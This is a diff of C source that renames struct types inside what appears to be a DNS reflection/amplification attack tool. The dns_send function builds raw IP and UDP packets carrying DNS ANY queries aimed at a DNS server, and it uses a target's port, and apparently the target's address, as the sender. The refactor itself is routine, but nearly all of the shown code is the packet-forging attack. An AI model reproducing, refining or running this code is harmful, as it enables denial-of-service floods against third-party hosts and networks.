@@ -53,7 +53,7 @@ void dns_format(unsigned char *dns, unsigned char *host)
 }
 
 // Creates the dns header and packet
-void dns_hdr_create(dns_hdr *dns)
+void dns_hdr_create(dns_header *dns)
 {
 	dns->id = (unsigned short)716034;
 	dns->flags = htons(0x0100);
@@ -70,16 +70,16 @@ void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
 
 	unsigned char dns_data[128];
 
-	dns_hdr *dns = (dns_hdr *)&dns_data;
+	dns_header *dns = (dns_header *)&dns_data;
 	dns_hdr_create(dns);
 
 	unsigned char *dns_name, dns_rcrd[32];
-	dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
+	dns_name = (unsigned char *)&dns_data[sizeof(dns_header)];
 	strcpy(dns_rcrd, dns_record);
 	dns_format(dns_name, dns_rcrd);
 
 	query *q;
-	q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
+	q = (query *)&dns_data[sizeof(dns_header) + (strlen(dns_name) + 1)];
 	q->qtype = htons(0x00ff);
 	q->qclass = htons(0x1);
 
@@ -87,19 +87,19 @@ void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
 	char datagram[4096], *data, *psgram;
 	memset(datagram, 0, 4096);
 
-	data = datagram + sizeof(iph) + sizeof(udph);
-	memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);
+	data = datagram + sizeof(iphdr) + sizeof(udphdr);
+	memcpy(data, &dns_data, sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query) + 1);
 
 	struct sockaddr_in sin;
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(dns_p);
 	sin.sin_addr.s_addr = inet_addr(dns_srv);
 
-	iph *ip = (iph *)datagram;
+	iphdr *ip = (iphdr *)datagram;
 	ip->version = 4;
 	ip->ihl = 5;
 	ip->tos = 0;
-	ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
+	ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query);
 	ip->id = htonl(getpid());
 	ip->frag_off = 0;
 	ip->ttl = 64;
@@ -109,10 +109,10 @@ void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
 	ip->daddr = sin.sin_addr.s_addr;
 	ip->check = csum((unsigned short *)datagram, ip->tot_len);
 
-	udph *udp = (udph *)(datagram + sizeof(iph));
+	udphdr *udp = (udphdr *)(datagram + sizeof(iphdr));
 	udp->source = htons(trgt_p);
 	udp->dest = htons(dns_p);
-	udp->len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+	udp->len = htons(8 + sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query));
 	udp->check = 0;
 
 	// Pseudoheader creation and checksum calculation
@@ -121,13 +121,13 @@ void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
 	pshdr.daddr = sin.sin_addr.s_addr;
 	pshdr.filler = 0;
 	pshdr.protocol = IPPROTO_UDP;
-	pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+	pshdr.len = htons(sizeof(udphdr) + sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query));
 
-	int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
+	int pssize = sizeof(ps_hdr) + sizeof(udphdr) + sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query);
 	psgram = malloc(pssize);
 
 	memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
-	memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+	memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udphdr) + sizeof(dns_header) + (strlen(dns_name) + 1) + sizeof(query));
 
 	udp->check = csum((unsigned short *)psgram, pssize);
 
